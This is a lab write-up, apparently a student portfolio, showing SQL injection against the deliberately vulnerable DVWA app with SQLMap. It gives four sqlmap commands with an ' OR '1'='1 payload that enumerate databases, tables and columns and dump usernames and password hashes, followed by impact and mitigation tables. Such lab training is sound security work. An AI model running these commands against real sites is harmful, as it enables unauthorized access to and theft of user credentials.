# SQL Injection Lab Overview
This lab highlights the security risks associated with improper input validation and weak database security controls. It demonstrates how attackers can exploit SQL injection vulnerabilities to gain unauthorized access to sensitive information from insecure web applications.

## Objective
The objective of this lab is to demonstrate SQL injection testing and database enumeration using SQLMap against the intentionally vulnerable Damn Vulnerable Web Application (DVWA). The lab aims to provide an understanding of how SQL injection vulnerabilities can be exploited to enumerate databases, extract schema information, and retrieve sensitive data from insecure web applications.

## Tools Used
- Kali Linux (The attack machine)
- SQLMap (SQL Injection automation)
- DVWA (A vulnerable test website)
- Browser (To access DVWA)

## Tasks Performed
- Tested web application for SQL injection
- Enumerated databases
- Listed tables and columns
- Extracted sample data

# 1. Database enumeration
sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
--dbs

# 2. List tables in DVWA database
sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa --tables

# 3. Extract columns from users table
sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa -T users --columns

# 4. Dump username and password data
sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa -T users -C user,password --dump

```

## Skills Demonstrated
- Web application penetration testing (SQL Injection)
- SQLMap-based automated exploitation
- Database enumeration and schema discovery
- Sensitive data extraction and analysis
- Vulnerability assessment and validation
- Secure coding awareness (OWASP Top 10: Injection)



## Identification of Security Impact
| Vulnerability              | Security Impact                                       |
| -------------------------- | ----------------------------------------------------- |
| SQL Injection              | Unauthorized database access and data exfiltration    |
| Poor input validation      | Execution of malicious SQL queries                    |
| Weak session handling      | Session hijacking or abuse                            |
| Exposed database structure | Increased attack surface and reconnaissance advantage |


## Mitigation Recommendations
| Mitigation                        | Purpose                                    |
| --------------------------------- | ------------------------------------------ |
| Prepared statements               | Prevents direct SQL query manipulation     |
| Parameterized queries             | Separates user input from SQL logic        |
| Input validation & sanitization   | Blocks malicious payloads before execution |
| Least privilege database accounts | Limits damage from compromised queries     |
| Web Application Firewall (WAF)    | Detects and blocks injection patterns      |
| Secure error handling             | Prevents database structure leakage        |

## Key Learning Outcome
This lab demonstrated how SQL injection vulnerabilities can be exploited using automated tools like SQLMap to extract sensitive database information. It reinforced the importance of secure coding practices and input validation in preventing injection-based attacks.

